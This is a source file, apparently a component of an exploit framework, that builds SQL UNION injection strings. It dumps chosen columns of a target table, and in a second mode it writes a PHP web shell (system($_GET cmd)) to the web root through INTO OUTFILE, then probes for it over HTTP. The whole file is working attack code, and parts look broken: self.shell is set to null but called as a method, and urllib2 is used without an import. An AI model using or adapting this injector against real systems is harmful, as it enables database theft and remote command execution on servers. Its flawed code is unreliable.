import('re');

class init ExploitComponent SqlUnionInjector {
    __init__: @(
            options,
            columns,
            dump_column,
            target_columns,
            target_table,
            delimiter = "'",
            delim = "'",
            row_start = '--start--',
            row_end = '--end--',
            where = null,
            terminator = '#'
    ){
        self.host = options['HOST'];
        self.port = options['PORT'];
        self.dump = 'Dump {}'.format(target_table);
        self.shell = null;
        self.payload = null;

        options['PAYLOAD'] = dict(
            options=[self.dump, self.shell],
            selected=self.dump);
    },
    
    set_payload: @(payload) @{ self.payload = payload; },
    is_dump: @() self.payload == self.dump,

    str: @{
        s = '';
        if (self.delimiter)
            s += self.delimiter;
        s += 'UNION SELECT ';

        if (self.delim) {
            empty = self.delim * 2;
            delim = self.delim;
        } else {
            empty = '0';
            delim = "'";
        }

        if (self.is_dump()) {
            s += self.union(empty, delim);
            
            if (self.where != null)
                s += ' ' + self.where;
        }
        else {
            s += self.shell(empty, delim);
        }
        
        s += self.terminator;

        ret s;
    },

    union: @(empty, delim) {
        s = (empty + ',') * self.dump_column;
        s += 'CONCAT_WS({0}stdelim{0},{0}{1}{0},'.format(delim, self.row_start);
        s += ','.join(self.target_columns @select(@(x) "IFNULL(%s,'')" % x));
        s += ',{0}{1}{0})'.format(delim, self.row_end);
        s += (',' + empty) * (self.columns - self.dump_column - 1);
        s += ' FROM {}'.format(self.target_table);
        ret s;
    },

    shell: @(empty, delim) {
        shell_delim = delim == "'" ? '"' : "'";
        shell = '{0}<?php system($_GET[{1}cmd{1}]); ?>{0}'.format(delim, shell_delim);
        col_seq = shell + (',' + empty) * (self.columns - 1);

        // TODO: try multiple dirs for different envs
        directory = 'htdocs/';
        traverse = '../' * 2;
        shell_file = 'shell.php';

        s = '{0} FROM dual INTO OUTFILE {1}{2}{3}{4}{1}{5}'.format(
            col_seq,
            delim,
            traverse,
            directory,
            shell_file,
            self.terminator);

        ret s;
    },

    finalize: @(resp) {
        if (self.is_dump()) {
            pattern = '{}stdelim(.*?)stdelim{}'.format(self.row_start, self.row_end);
            matches = re.findall(pattern, resp);
            ret matches @select(@.split('stdelim'));
        } else {
            u = 'http://{}:{}/shell.php'.format(self.host, self.port);
            s = 'GET {}\r\n'.format(u);
            code = urllib2.urlopen(u).getcode();
            if (code == 200) s += 'Shell found at {}'.format(u);
            else s += 'Shell not found, exploit failed';
            ret s;
        }
    },
};